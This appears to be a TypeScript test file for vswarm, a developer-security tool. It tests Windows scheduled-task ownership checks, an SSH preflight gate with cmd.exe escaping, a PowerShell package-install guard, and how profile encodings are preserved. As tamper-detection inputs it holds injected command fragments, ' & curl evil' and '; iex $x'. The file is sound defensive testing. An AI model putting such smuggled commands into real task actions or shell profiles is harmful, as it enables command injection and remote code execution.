    const sec = tmp("sec");
    process.env.VSWARM_SEC_DIR = sec;
    try {
      const a = winTaskAction(launcher);
      const action = `${a.execute} ${a.args}`;
      const task = (id: string, program: string) => ({ kind: "launch", id, name: id.slice(5), source: "system-agent", hash: "", meta: { program } }) as any;
      expect(ownWatchTask(task("task:\\vswarm\\watch", action))).toBe(false);
      recordManagedFile(action);
      expect(ownWatchTask(task("task:\\vswarm\\watch", action))).toBe(true);
      expect(ownWatchTask(task("task:\\vswarm\\watch", action + " & curl evil"))).toBe(false);
      expect(ownWatchTask(task("task:\\Updater", action))).toBe(false);
      // Through the real collector path: the same snapshot with and without the task.
      const items = windowsItems({ tasks: [{ path: "\\vswarm\\", name: "watch", state: "Ready", actions: [action] }] }, tmp("home")).items;
      expect(items.filter((i) => !ownWatchTask(i))).toEqual([]);
    } finally {
      delete process.env.VSWARM_SEC_DIR;
    }
  });
});

describe("windows: ssh gate and install guard", () => {
  const { sshGate, cmdWord, readKept, writeKept, setBlock } = require("../src/setup");
  const { psGuardBlock, GUARD_START, GUARD_END } = require("../src/sec/pkg");
  const { recordManaged, stripManaged } = require("../src/sec/store");

  test("the gate runs through cmd.exe: spaces escaped with ^, no host name, % and quotes refused, no certificates", () => {
    const g = sshGate(["prod-*"], ["C:\\Users\\a b\\.vswarm\\bin\\vswarm.cmd"], { win: true });
    expect(g).toContain('Match originalhost prod-* !exec "C:\\Users\\a^ b\\.vswarm\\bin\\vswarm.cmd preflight --quiet"');
    expect(g).toContain('ProxyCommand cmd.exe /d /c "echo vswarm: this machine did not pass preflight; run: vswarm preflight 1>&2 & exit 1"');
    expect(g).not.toContain("%h");
    expect(cmdWord("C:\\a&b (x)\\v^.cmd")).toBe("C:\\a^&b^ ^(x^)\\v^^.cmd");
    expect(() => cmdWord("C:\\%TEMP%\\v.cmd")).toThrow("%");
    expect(() => sshGate(["prod-*"], ["C:\\v.cmd"], { win: true, cert: { key: "k", cert: "c" } })).toThrow("not on Windows");
    // macOS and Linux keep the shell form.
    expect(sshGate(["prod-*"], ["/v/vswarm"], { win: false })).toContain('!exec "/v/vswarm preflight --quiet --host %h"');
  });

  test("the PowerShell guard calls bun and the CLI by full path, quoted for PowerShell, and has no brew", () => {
    const b = psGuardBlock("C:\\Users\\a b\\.bun\\bin\\bun.exe", "C:\\Users\\o'x\\.vswarm\\app\\src\\cli.ts");
    expect(b.startsWith(GUARD_START) && b.endsWith(GUARD_END)).toBe(true);
    expect(b).toContain("& 'C:\\Users\\a b\\.bun\\bin\\bun.exe' 'C:\\Users\\o''x\\.vswarm\\app\\src\\cli.ts' pkg $tool '--' @a");
    expect(b).toContain("function npm { __vswarm_go npm '^(install|i|");
    expect(b).toContain("function yarn { __vswarm_go yarn '^(|install|");
    expect(b).toContain("function npx { __vswarm_go npx '.*' $args }");
    expect(b).not.toContain("function brew");
  });

  test("a profile keeps its encoding when the guard is added and removed", () => {
    const d = tmp("enc");
    const sec = tmp("sec");
    process.env.VSWARM_SEC_DIR = sec;
    const block = psGuardBlock("C:\\b\\bun.exe", "C:\\ทดสอบ\\cli.ts");
    try {
      const cases: [string, Buffer][] = [
        ["utf16le", Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from("Set-Alias ll ls\r\n# ไทย\r\n", "utf16le")])],
        ["utf8bom", Buffer.concat([Buffer.from([0xef, 0xbb, 0xbf]), Buffer.from("$x = 'ไทย'\n")])],
        // A Thai line in Windows-874: not UTF-8, so its bytes must come back exactly.
        ["latin1", Buffer.from([0x24, 0x78, 0x3d, 0x27, 0xb7, 0xb4, 0xca, 0xcd, 0xba, 0x27, 0x0a])],
      ];
      for (const [enc, bytes] of cases) {
        const f = join(d, `${enc}.ps1`);
        writeFileSync(f, bytes);
        const before = readKept(f);
        expect(before.enc).toBe(enc);
        if (enc === "latin1") {
          // The new lines carry Thai characters this code page file cannot hold as they are: refused, file untouched.
          expect(() => setBlock(f, block, GUARD_START, GUARD_END)).toThrow("not UTF-8");
          expect(readFileSync(f).equals(bytes)).toBe(true);
          setBlock(f, psGuardBlock("C:\\b\\bun.exe", "C:\\a\\cli.ts"), GUARD_START, GUARD_END);
        } else setBlock(f, block, GUARD_START, GUARD_END);
        const after = readKept(f);
        expect(after.enc).toBe(enc);
        expect(after.text.startsWith(before.text.trimEnd())).toBe(true);
        expect(after.text).toContain(GUARD_START);
        // The scan does not count vswarm's own block as a change.
        expect(stripManaged(after.text).trimEnd()).toBe(before.text.trimEnd());
        setBlock(f, null, GUARD_START, GUARD_END);
        expect(readKept(f).text.trimEnd()).toBe(before.text.trimEnd());
        expect(readKept(f).enc).toBe(enc);
      }
      // A new profile gets a UTF-8 BOM, so Windows PowerShell 5.1 does not read it as ANSI.
      const fresh = join(d, "new", "profile.ps1");
      setBlock(fresh, block, GUARD_START, GUARD_END);
      expect(readKept(fresh).enc).toBe("utf8bom");
      // A plain UTF-8 profile that now holds non-ASCII text gets the BOM too.
      const plain = join(d, "plain.ps1");
      writeFileSync(plain, "Set-Alias ll ls\n");
      setBlock(plain, block, GUARD_START, GUARD_END);
      expect(readKept(plain).enc).toBe("utf8bom");
    } finally {
      delete process.env.VSWARM_SEC_DIR;
    }
  });

  test("vswarm's block is still its own after an editor turns its line endings into CRLF", () => {
    process.env.VSWARM_SEC_DIR = tmp("sec");
    try {
      const block = psGuardBlock("C:\\b\\bun.exe", "C:\\a\\cli.ts") + "\n";
      recordManaged(block);
      expect(stripManaged("Set-Alias ll ls\r\n" + block.replace(/\n/g, "\r\n"))).toBe("Set-Alias ll ls\r\n");
      expect(stripManaged(block.replace("pkg $tool", "pkg $tool; iex $x"))).toContain("iex");
    } finally {
      delete process.env.VSWARM_SEC_DIR;
    }
  });
});
